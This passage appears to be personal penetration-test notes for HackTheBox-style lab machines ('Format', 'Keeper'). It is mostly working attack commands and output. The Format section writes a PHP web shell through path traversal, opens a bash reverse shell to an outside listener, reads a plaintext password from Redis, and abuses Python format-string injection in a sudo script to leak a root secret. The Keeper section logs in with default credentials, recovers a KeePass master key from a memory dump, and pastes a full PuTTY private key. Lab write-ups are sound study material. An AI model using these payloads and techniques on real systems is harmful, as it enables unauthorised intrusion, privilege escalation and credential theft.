POST /edit/index.php HTTP/1.1
Host: testc.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: </rich_text>
        <rich_text link="webs http://testc.microblog.htb">http://testc.microblog.htb</rich_text>
        <rich_text>
Connection: close
Referer: </rich_text>
        <rich_text link="webs http://testc.microblog.htb/edit/?message=Section%20added!&amp;status=success">http://testc.microblog.htb/edit/?message=Section%20added!&amp;status=success</rich_text>
        <rich_text>
Cookie: username=fudunsp094duhpcp9eg6c9skiv
Upgrade-Insecure-Requests: 1

id=../../../../../../../var/www/microblog/testc/uploads/test.php&amp;header=hello


then send web shell

id=../../../../../../../var/www/microblog/testc/uploads/test.php&amp;header=&lt;?php echo system($_GET["cmd"]);?&gt;


/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.68/9001 0&gt;&amp;1'


in burp

GET /uploads/test.php?cmd=/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.68/9001+0&gt;%261'


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.68] from (UNKNOWN) [10.129.123.98] 39340
bash: cannot set terminal process group (601): Inappropriate ioctl for device
bash: no job control in this shell
www-data@format:~/microblog/testc/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@format:~/microblog/testc/uploads$ whoami
whoami
www-data
www-data@format:~/microblog/testc/uploads$

python3 -c 'import pty;pty.spawn("/bin/bash")'
control + z
stty raw -echo
fg
export TERM=xterm
stty rows 62 columns 207

run linpeas.sh


www-data@format:~$ redis-cli -s /var/run/redis/redis.sock 
redis /var/run/redis/redis.sock&gt;
redis /var/run/redis/redis.sock&gt; KEYS *cooper*
1) "cooper.dooper:sites"
2) "cooper.dooper"
redis /var/run/redis/redis.sock&gt; HGETALL cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"

cooper:zooperdoopercooper


ssh cooper@microblog.htb     
cooper@format:~$ whoami
cooper
cooper@format:~$ id
uid=1000(cooper) gid=1000(cooper) groups=1000(cooper)
cooper@format:~$ 
cooper@format:~$ cat user.txt 
124262b9d86294c82a8a3f70021729b8

run linpeas.sh

cooper@format:/dev/shm$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license



HSET test4 username test password test first-name test last-name {license.__dict__} pro false
HSET test6 username test password test first-name test last-name {license.__init__.__globals__} pro false


cooper@format:/dev/shm$ sudo /usr/bin/license -p test6

Plaintext license key:
------------------------------------------------------
microblogtestTv=x@uL;*!1sf@2i:/015guci`nKp|?\Ws`[b[AFtest{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7debcecfa0&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': '/usr/bin/license', '__cached__': None, 'base64': &lt;module 'base64' from '/usr/lib/python3.9/base64.py'&gt;, 'default_backend': &lt;function default_backend at 0x7f7debb3e430&gt;, 'hashes': &lt;module 'cryptography.hazmat.primitives.hashes' from '/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py'&gt;, 'PBKDF2HMAC': &lt;class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'&gt;, 'Fernet': &lt;class 'cryptography.fernet.Fernet'&gt;, 'random': &lt;module 'random' from '/usr/lib/python3.9/random.py'&gt;, 'string': &lt;module 'string' from '/usr/lib/python3.9/string.py'&gt;, 'date': &lt;class 'datetime.date'&gt;, 'redis': &lt;module 'redis' from '/usr/local/lib/python3.9/dist-packages/redis/__init__.py'&gt;, 'argparse': &lt;module 'argparse' from '/usr/lib/python3.9/argparse.py'&gt;, 'os': &lt;module 'os' from '/usr/lib/python3.9/os.py'&gt;, 'sys': &lt;module 'sys' (built-in)&gt;, 'License': &lt;class '__main__.License'&gt;, 'parser': ArgumentParser(prog='license', usage=None, description='Microblog license key manager', formatter_class=&lt;class 'argparse.HelpFormatter'&gt;, conflict_handler='error', add_help=True), 'group': &lt;argparse._MutuallyExclusiveGroup object at 0x7f7dea6f1b80&gt;, 'args': Namespace(provision='test6', deprovision=None, check=None), 'r': Redis&lt;ConnectionPool&lt;UnixDomainSocketConnection&lt;path=/var/run/redis/redis.sock,db=0&gt;&gt;&gt;, '__warningregistry__': {'version': 0}, 'secret': 'unCR4ckaBL3Pa$$w0rd', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': &lt;cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7f7dea705280&gt;, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': &lt;cryptography.fernet.Fernet object at 0x7f7dea705640&gt;, 'l': &lt;__main__.License object at 0x7f7dea705a60&gt;, 'user_profile': {b'username': b'test', b'password': b'test', b'first-name': b'test', b'last-name': b'{license.__init__.__globals__}', b'pro': b'false'}, 'existing_keys': &lt;_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'&gt;, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'test4:gAAAAABk1k882YuVvRJn_JvMAuyLx3uD_GKfTQHi7xnI1kNgwC-4zP1EmAGIM9pi2C_bImp2bAEoUc5M1Dh4ebx0FdRtldDj4pX9sUnGlmOWJ2mrVMizKQoG_qgnP5m5VKBJ05fJoxt9puzWTqvaH0MdewLpKAVLpxhtKo8oVPSfGNDmsuAQydWDks15LLDFfAxSasl1ISwIAJ-Whi7-KERHiDeVPWYzKhmrJLeKiOpZ0I4-T5Ui23oRyQNVnzgTrvGxIhNqg9Un9vGUpmdj3-9R2GVZA3aORA==\n', 'test5:gAAAAABk1k9gTJNfem9SH0yfIUb8nMLz4K92Nvcw7rzhEl2h8_HSbBu3zJWYS0fsSRD-1poxCvjvcZ7i6TJS1Mo1u3urmmN1tZWdc_N6qZ9_EEOz8XI8LItmXzIeOkfq0p3TNzgjzrjHYqWdEqODQoVk61xUH5j3nuu-z5831nj3l9_2knyYd_RH4rlT3T7li8UbhvyjmhMUhUQdprCHhv__wBjyMXzcURqaTjjsDCvODxKfVK7xmfuWkY3jj_Ybh0Od7THR5Nau\n'], 'user_key': 'test5:gAAAAABk1k9gTJNfem9SH0yfIUb8nMLz4K92Nvcw7rzhEl2h8_HSbBu3zJWYS0fsSRD-1poxCvjvcZ7i6TJS1Mo1u3urmmN1tZWdc_N6qZ9_EEOz8XI8LItmXzIeOkfq0p3TNzgjzrjHYqWdEqODQoVk61xUH5j3nuu-z5831nj3l9_2knyYd_RH4rlT3T7li8UbhvyjmhMUhUQdprCHhv__wBjyMXzcURqaTjjsDCvODxKfVK7xmfuWkY3jj_Ybh0Od7THR5Nau\n', 'prefix': 'microblog', 'username': 'test', 'firstlast': 'test{license.__init__.__globals__}'}

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABk1k-p5mPuRG_L8qUsKKjbbl1q594wJHuWPwQIQmIUAegHX3bsjz8p_xFWhInHChWfmvU3GLCaGZKODoHUbolrDjjc2AdiEEqHhTVM1lhWDyE-FNX4LBzGGWv5caVXZbmHYl94xHnlHk9lbRzCnT-UmPqMPCuv5cr8mkIVr-M4xVlQKGxzq_jkkq9S4GFOsRslJzPMvG4QFFgM5YR13OocU69qj6GdSCiR86lqhX4ptT19FHvf0oFhF28Q9Pr3EenD0MiicsYQovSVj1S47N1rDcFufcAXN6XWJta-6luSzE26JYM9O7qurjU8mTPgoGZhI7UNV9GmSqkt-xttTqXtHsfclG0SRj-BkX9k2uz4pdPOygyRff8IA-eJcAEw4Ebjbvzw8QNlUJ7qverCEbt0j_cLmdsGHf8nCAoX0FIHeKkCWbjHAUa7Es0T5GYsItavkw46HORbQr2dLuYcrt3cbZUCG_wILQwxMYJ-jhZoy-kRdeFpJ4QRJxLm0GF8KXYoZ0csCoBNIf7OcaU27GwpXgEDBnBlWVc_d84pdpzg27vMJ94-8T-fP1RUEsvWYjEgBnjFYJDuc4ylLscDFilxdzQEpxE89beE6dD32G_ynm-TC2RjuQXvlNNu3SuXiTzwzNFgdmRXWTmwKvhR7rpVUjLwDnILwWNcbRqxlLGoCcpmSMeYukOkpq0Ozoh3iu2XsSJMlt3fKw8mDh0SlmCwAsIJ8art3cyVe6WKcgHd2tSmrvxjdaP5hPgm7bUWvzrYHILPNjp8nlYK2cLEfHq6199T_zwP1X1WWOHsKQ8CFcyuwXomoghZdejYVq0q5YbZ60bgJDklBl7NYkpFOmveZAZto7IUl3Tq5zzKTtcE5N36TBiTDcXTvdN6mcpeRSL8IZKAJHEDpN5a756NoUy3Yd7pUT0yKDp6hviNLSezL9maL3rQG89qNjPqrkYvdLUGNPvtlNBI8mznfi8kU234LUpXuvxYrH2voLaLqBqs7Ug09CX8pG1wzAi21MG4BYugS--QxGrD7KH6PtrNYF6jbeeDYZkBY8fiXPOqatZoGGrOBGC3OnCl_tmnCF3-BxEwZDeHaIg5LGu4WSO8_KqwmfRYSakfpRbgpzMiVqWsMd3AWq-uSBJpFVyi7o9MOrYwH_iLVdBD6YOIhUePeIOL-P_8zNsjdwKkClrC8bMPc0F1Rjkz_oJbUCc4T-ypDt6BVD_pBA4NEfUTHbx6H2stOQexh8vVqZkNLr9pMJ7unX5m3U-ml7LI3LQCL6bEtRktCUn5ALMwX7KfQWmRoFTLHUn1k5hoFy_GJFnqPTWx-7NYycKSp5ZRQ-X9VWx7NiwEPS_VyJGqP56qTjj4ckn1F_xp3XbQea2qPeXyBbVSOnuqAWSbfTGFWXE6Am7_SsJeG6MvyvS5Q8OhqBfK0ZYZGFSEliLEEOlYmYwBAsEixSEcsIX7h8r9xuZtQLHSlt_HjTV5Zl-u4Sgq5rIIyj8eaP-kFjvRypiP5yD4LGPKQGN4wVKVhXD-XN92WkL2_is73f6XJfZrPdRTvnbuAlXyJW33V8IuGuYrWqtNXxBY-cxcLOQU7-s2QdT0OtHzbPCBLQA4xfY44ovm7zXCj-91ygyFNq8t5lfHa6lTOhBBRUT1mOLKfWnOa8IEdzVswmzYXyYqcBe6M7plr1GkzehORI32dXGAx77bXdfAlgtyW_2hjMkqIiEgH0mC58XmwudZS7ExAIQndQBrPsRLm4v-vm3p30ZH_fCGTX0TCm5MlfCqx5vwgfifKfG5Iw8STEgEFpeXuwbXmOBxcMp1Xcfig5V0GTZMZIu41KkAICL_1-122LJZkozv1coDiLFs_WVIDP7onJTCmybqzc_w4HQNB_YN3lL1-PiI44V2e_36uWPnlGLyz-QdeNRzk-Pe_tSfd8DPdobifVAhbLp6Oes4Rx41ieaqx-c8DYvqPV-z7IBk3q6nF51pAUFNQK3Q4Lnz6941J3I28GCDRlekYbYDNS-NiPyl48q75lpRctImVmHJLUaETiqm4YlGwaJXwkI77wnl9EhmdBP_Nl0htU8VD5LDn_anMSo1yGT-V7P-mGejrfnW7w3NCjhv-sTM31lhn_dKfHDCQi80OeKvCbRm6BLfG4-__RmbybdAUCNboBysHVhFr70JgRxyWlEGTInSFgTyliPex3go4sX6AUzUhtYDmR-2y6-PfeZYClJBeVTxfzAFg7lPtKktXTlPt_soeKrLP_9DUpld5bs-Q1gHQyjf_NvmUIfWb4ENzQIdpYDGlOewQQPB4YTFQwnY3hsq77iyt4r-79qtHiL-liBnzLa4Viidonu7c89QUUHaePEUXm0CQIrW4ZlSc-2sTjbRWNWc1RA-N6w5zuH4pqn7PHZACYQcjceWm67yi1cX_4fACJh9pXqKkPFB13IdhdSslCOcqnLBY98F073EH3sgO8UcA1TQmmfxeXvLq3Hi9_7qZ3U0opWTyPNu70Sus_7w8odNvKlOgVhLqzFMY7EzTWiP4KQx2xa9YBVcI9lQ5uD62XsyyJvxGeC-R3u8Ga1p7LomoEVAIFY14cHApy__BEQrclzQ5aNjrlO1wJjRnoltc-5EjBPw24Fe1D8JeqZ0RnVm05UviTOkupxwg7iAAEMx7ZfCZ6ojt9JieJ4AwoCFMvdTgaF1OPT89QDuqghP44YgXrXKa-ivPoYVv_uKUYEQPekVnx4WCiud9Ojumw3KCAPRGabYrHFcyhlDoz1erR4UY0YqnD_Ob-ilJWkUjh7sPXG6SBsFk0yxW0CSQyX2aQYb0l3JGvz0vd-z1-YpMXseAY_5Tho3bksAn1fHOc68BZ0BzaBBKK-vkCOhcBGUtnUqmDaeT83Pe8SnWiS6jKIccRT9EWt_Ke8tkjLvpQutvM3tBp7DQvFI0fxGsDfhLOEv7sL8P0Wa1Q2lFt8Dm6zd02fvcfT4e_DB0vwqUjrnlwYeNrfsFnhLFGYs3D59uXak53AqskZiKT-TRxqWJAp5Rdd_rY5OAd3kAQ4DoSYEiJ6VA1S8NtK6cpEzB8RRRLhXvfMx0gnVC2A5zo1WJpUlgZdgspADG3W-QNTF2FqumYo0q5yzKoSy_liDUQgsuTFpFEY9NI4cnR8PaL80cSn9f-7ZxIA1k3XsgiVqghcxJw94MzXErWKJNqrz6sALhOkeK-Z--BVdgHfsYdOYXiZlPfnN7Bvgjbx-Ijc5CoDG2KLVZ1724DjYpe61DryjrItIUfCpjxDXgGzJ-dL-H-NeZIfLgfhqA_0IO0CfAaVg9x7l9VU7AfWs_9mMKVbjOZfqE_6U8z-J9LOMQTMw4ywBmHDdhmP9D0PgeVK7eD3prBBqxD1FuG9C8R4ztX1Dv7mNYSBCdvlmA9-SJJtFiSlqR-L6dKwmP4J3_YUCbF-0OF3LodOnKH1ZfL-rsivt2pj3CVTvoDWkIdJrYtPd4mZ3xVtwSlIVB5vhdoiHHHQ2cWG2rI1rD-9Ra1hnmEY7Pa8SZnzDJxPvTug7EP2L0LCEVZ955ULwj9ekWBLPOyy10bereXZbp9PvJZvwd9fEBCfzSQBGYY5eIzmJKzHmiE92lzM2NZPFzpWV21qJO-LtFQIDwEw04qhU5oq-a2jMNtSqE9gDwIXpetrd7suAa8PokGMOLMxt1TSBgtb_WeaQRVT3gx3W7gCP4CCuipx-FnagVrhvTlus0ZE6SzxJo1p5EJO0AVqRTEVHs7GCzZTrV56Ny-werZu_XTaWjjFzIuQeA9ZQ3eMPGGoWuxC-QG4pgWWc3RnfTd44JJXhNh6W9MviUFbiOmtNmsZ_YAF1GdK55c-BSLE0wLvn8vicVF_1oHorqcbuD7mqm7lYpROC_nna0BhZqqejDsSk3dqOQuGdFzsTBhx5ZWCujyzcDfCICVLooU96W_C0bszUbNU1yv0mAEpvZB5edn1G9d5h90dl0yOBdwVyXGvs06fLe6IdrirlykqJh-d5tVo3vwPa1hv8jpI5xnGFh4OA3kdmrK4ThREVXH-XXEkXkQs2Dt5vYTZaYMiX0s8-MYavmfEPp0_9mCLtlxke80MFEoPZMvHfCkbXsVwNXeLpPwMEVe562S2ph8LYfKuS7HK7HuRYJIGP6Fo0MYWsXGcCoNKsIVyV28TXSQ5awyGdZQhYLrw8gwbYvOJ7q_eLIHr0nD6Xuv1XfVOVVpXVhyiROKAioNhMVFlTKNY_eF6IsA0ToqIsN5Y8vxEdUYy5gHQkE2A3sg3n5sF7h8UYJFd9kysMqqNzEml30SDlR1rE-8QtYA27ob4Wa6JkLXhHqz74KbQF9SlizC9CG2L4GZe5r9DtfXc3Rn4cu1tSgfutQd01kHvzjxAs7HJp5F7CCipIrr3-yPmGXeUXsATZNo3f4u5it-EMi8axhHSoo6yKEsZVbP5P9uC9Vtuw909msGp4OWldob3uJzT91ciVfzkWgxfJeu03vu4pXuiOAXcm8guatP1HIjMmwfEYx_8x8vyno4qtzuBEEIXXKauA-KEwadDL7HX0MPhFogYltOoD_5_DaKjXjpuW1lIXrEkxMjv2DTOxIdOC8HzuPaCal4-6EGbJQdsG7mzbD-wAdDcjmU__jBltoH7CXef5LhJKIjgpQ5_0nk9vb5AFU0guSpJc_-W8XXuhXEH5EZSg6_PXd9Fn7WbUUpC14gRv5kB5srD8jkJJKQ==




unCR4ckaBL3Pa$$w0rd


cooper@format:/dev/shm$ su - root
Password: 
root@format:~# id
uid=0(root) gid=0(root) groups=0(root)
root@format:~# whoami
root
root@format:~# cat /root/root.txt 
74f27d95a8a53ab6741f7d8f1d3baaf2</rich_text>
      </node>
      <node name="license script" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691763941" ts_lastsave="1691763942">
        <rich_text>#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
</rich_text>
      </node>
    </node>
    <node name="Keeper" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692002785" ts_lastsave="1692089711">
      <node name="nmap" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692002797" ts_lastsave="1692003115">
        <rich_text>sudo nmap -p- -sC -sV 10.129.121.152 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-14 04:49 EDT
Nmap scan report for 10.129.121.152
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 23.80 seconds
           Raw packets sent: 65557 (2.884MB) | Rcvd: 65537 (2.622MB)</rich_text>
      </node>
      <node name="buster" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692003115" ts_lastsave="1692003413">
        <rich_text>no need</rich_text>
      </node>
      <node name="exploit" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692003118" ts_lastsave="1692011004">
        <rich_text>login with default credentials

root:password

go to </rich_text>
        <rich_text link="webs http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27">http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27</rich_text>
        <rich_text>

see users and see default password for lnorgaard is Welcome2023!

then ssh

ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  </rich_text>
        <rich_text link="webs https://help.ubuntu.com">https://help.ubuntu.com</rich_text>
        <rich_text>
 * Management:     </rich_text>
        <rich_text link="webs https://landscape.canonical.com">https://landscape.canonical.com</rich_text>
        <rich_text>
 * Support:        </rich_text>
        <rich_text link="webs https://ubuntu.com/advantage">https://ubuntu.com/advantage</rich_text>
        <rich_text>
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ cat user.txt 
c5d7bb29dbbfd375a570e2aca45d8b30
lnorgaard@keeper:~$ whoami
lnorgaard
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)

run linpeas.sh

there is keepass files in home

lnorgaard@keeper:~$ ls -l
total 85352
-rw-r--r-- 1 root root      87391651 Aug 14 12:50 RT30000.zip
-rw-r----- 1 root lnorgaard       33 Aug 14 10:48 user.txt

lnorgaard@keeper:~$ unzip RT30000.zip

lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt

google for exploit “read keepass dump file”

</rich_text>
        <rich_text link="webs https://github.com/vdohney/keepass-password-dumper">https://github.com/vdohney/keepass-password-dumper</rich_text>
        <rich_text> for windows or

</rich_text>
        <rich_text link="webs https://github.com/z-jxy/keepass_dump">https://github.com/z-jxy/keepass_dump</rich_text>
        <rich_text> for linux

python3 keepass_dump.py -f ../KeePassDumpFull.dmp
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:	{UNKNOWN}
[*] 2:	d
[*] 3:	g
[*] 4:	r
[*] 6:	d
[*] 7:	 
[*] 8:	m
[*] 9:	e
[*] 10:	d
[*] 11:	 
[*] 12:	f
[*] 13:	l
[*] 15:	d
[*] 16:	e
[*] Extracted: {UNKNOWN}dgrd med flde

google “dgrd med flde”

and it asks "Did you mean: </rich_text>
        <rich_text style="italic" link="webs https://www.google.se/search?sca_esv=556714279&amp;sxsrf=AB5stBjIcWMBSg-T8OuA6WZcbU5wsCWyaw:1692010376497&amp;q=rodgrod+med+flode&amp;spell=1&amp;sa=X&amp;ved=2ahUKEwiIyMnr_duAAxU2QvEDHVhpBJYQBSgAegQIBxAB" weight="heavy">rodgrod</rich_text>
        <rich_text link="webs https://www.google.se/search?sca_esv=556714279&amp;sxsrf=AB5stBjIcWMBSg-T8OuA6WZcbU5wsCWyaw:1692010376497&amp;q=rodgrod+med+flode&amp;spell=1&amp;sa=X&amp;ved=2ahUKEwiIyMnr_duAAxU2QvEDHVhpBJYQBSgAegQIBxAB"> med </rich_text>
        <rich_text style="italic" link="webs https://www.google.se/search?sca_esv=556714279&amp;sxsrf=AB5stBjIcWMBSg-T8OuA6WZcbU5wsCWyaw:1692010376497&amp;q=rodgrod+med+flode&amp;spell=1&amp;sa=X&amp;ved=2ahUKEwiIyMnr_duAAxU2QvEDHVhpBJYQBSgAegQIBxAB" weight="heavy">flode</rich_text>
        <rich_text> "

click on the link and see
</rich_text>
        <rich_text link="webs https://www.tasteline.com/recept/rodgrod-med-flode/">
</rich_text>
        <rich_text link="webs https://www.tasteline.com/recept/rodgrod-med-flode/" scale="h3">Rødgrød med fløde</rich_text>
        <rich_text>

open database with password “rødgrød med fløde”

save the putty key file to kali and login as root with putty

load the key in putty

cat root.txt
ba1646da26bd6aca4f47a532bb2ed32d</rich_text>
      </node>
      <node name="creds" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692003131" ts_lastsave="1692010827">
        <rich_text>root:password
lnorgaard:Welcome2023!

PuTTY-User-Key-File-3: ssh-rsa&#13;
Encryption: none&#13;
Comment: rsa-key-20230519&#13;
Public-Lines: 6&#13;
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D&#13;
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T&#13;
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM&#13;
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu&#13;
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ&#13;
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et&#13;
Private-Lines: 14&#13;
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j&#13;
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih&#13;
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY&#13;
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT&#13;
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz&#13;
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs&#13;
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz&#13;
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r&#13;
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV&#13;
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa&#13;
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA&#13;
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD&#13;
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy&#13;
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=&#13;
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

root:</rich_text>
      </node>
    </node>
    <node name="TwoMillion" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692089711" ts_lastsave="1692192859">
      <node name="nmap" unique_id="64" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692089714" ts_lastsave="1692096163">
        <rich_text>sudo nmap -p- -sC -sV 10.129.120.21 -oA nmap/all 
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-15 05:49 EDT
Nmap scan report for 10.129.120.21
